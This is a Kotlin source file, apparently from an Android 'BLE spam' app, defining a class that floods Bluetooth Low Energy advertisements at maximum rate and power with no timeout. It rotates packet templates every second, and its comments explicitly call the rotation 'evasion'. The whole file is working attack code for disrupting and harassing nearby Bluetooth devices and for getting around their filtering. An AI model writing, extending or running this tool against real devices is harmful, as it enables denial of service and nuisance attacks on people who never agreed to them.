package com.tutozz.blespam

import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseSettings
import android.os.Handler
import android.os.Looper
import android.util.Log

class BleCyclerSpam : Spammer() {
    private val TAG = "BleCyclerSpam"
    private val handler = Handler(Looper.getMainLooper())
    private var packetIndex = 0

    // Get the Bluetooth Advertiser instance
    private val bleAdapter = BluetoothAdapter.getDefaultAdapter()
    private val bleAdvertiser = bleAdapter?.bluetoothLeAdvertiser

    // Aggressive settings for flooding (high rate + power)
    private val floodSettings = AdvertiseSettings.Builder()
        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)  // Max packet rate (Flooding)
        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)    // Max range (Flooding)
        .setConnectable(false) // Pure spam mode (non-connectable is faster)
        .setTimeout(0) // Indefinite
        .build()

    // Define the AdvertisingCallback
    private val advertisingCallback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
            super.onStartSuccess(settingsInEffect)
            Log.d(TAG, "Ad cycle started successfully with new packet.")
        }

        override fun onStartFailure(errorCode: Int) {
            super.onStartFailure(errorCode)
            Log.e(TAG, "Advertising failed: $errorCode")
            // Optionally stop the spammer on fatal error
            if (errorCode == ADVERTISE_FAILED_INTERNAL_ERROR || errorCode == ADVERTISE_FAILED_ALREADY_STARTED) {
                 stop() // Stop the cycler on major failure
            }
        }
    }

    // Dynamic Packet Cycling Logic (Evasion)
    private val packetCycler = object : Runnable {
        override fun run() {
            if (!isSpamming || bleAdvertiser == null || bleAdapter?.isEnabled != true) {
                // Self-cleanup if spamming is stopped or Bluetooth is off
                return
            }

            // 1. Stop the current advertisement (necessary before starting a new one)
            bleAdvertiser.stopAdvertising(advertisingCallback)

            // 2. Cycle to the next packet for evasion
            val rawPacket = BlePacketTemplates.ADVERTISEMENT_PACKETS[packetIndex]
            val newData = BlePacketTemplates.buildAdvertiseData(rawPacket)

            // 3. Restart with new data and aggressive settings
            bleAdvertiser.startAdvertising(floodSettings, newData, advertisingCallback)

            // 4. Update index and schedule the next rotation
            packetIndex = (packetIndex + 1) % BlePacketTemplates.ADVERTISEMENT_PACKETS.size
            
            // Rotation speed (1000L) is key for Evasion
            handler.postDelayed(this, 1000L) // Rotate every 1s for dynamic evasion
        }
    }

    override fun start() {
        if (bleAdvertiser == null || bleAdapter?.isEnabled != true) {
            Log.e(TAG, "Bluetooth not enabled or advertiser is null.")
            return
        }
        if (isSpamming) return

        isSpamming = true
        // Kick off the first run immediately, which starts the cycling
        handler.post(packetCycler) 
    }

    override fun stop() {
        if (!isSpamming) return

        isSpamming = false
        handler.removeCallbacks(packetCycler) // Stop the repetition
        
        // Stop the currently running advertisement
        try {
            bleAdvertiser?.stopAdvertising(advertisingCallback)
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping advertising: ${e.message}")
        }
        
        Log.d(TAG, "BLE Cycler Spam stopped.")
    }
}
